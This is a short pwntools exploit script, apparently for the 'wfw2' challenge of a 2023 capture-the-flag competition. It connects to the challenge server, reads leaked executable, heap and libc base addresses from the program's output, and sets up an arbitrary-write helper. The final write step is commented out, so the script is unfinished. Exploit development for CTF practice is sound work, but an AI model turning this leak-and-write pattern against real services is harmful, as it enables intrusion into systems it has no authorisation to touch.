#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("chal")
libc = ELF("./libc.so.6")
local = False 
if local:
    p = process("./chal")   
    gdb.attach(p,'''''')
else:
    p = remote('wfw2.2023.ctfcompetition.com', 1337)

elf = context.binary = ELF('./chal', checksec=False)

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
##################### Leak_addr #####################
p.recvuntil(b'the fluff\n')
exe = int(p.recv(12), 16)
log.info('/home/user/chal:  ' + hex(exe))
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()
heap = int(p.recv(12), 16)
log.info('[heap]            ' + hex(heap))
p.recvline()
p.recvline()
libc = int(p.recv(12), 16)
log.info('Libc_base:        ' + hex(libc))
log.info('Alarm_clock:      ' + hex(libc + 0x1b6d75))
#####################################################

def write_to(addr, size):
    log.info(hex(addr) + ' ' + str(size))
    sl(hex(addr) + ' ' + str(size))
    


#p.recvuntil(b'[vdso]')
#p.sendline(hex(exe + 16464) + ' ' + str(10))
log.info(hex(exe + 16464) + ' ' + str(10))
p.interactive()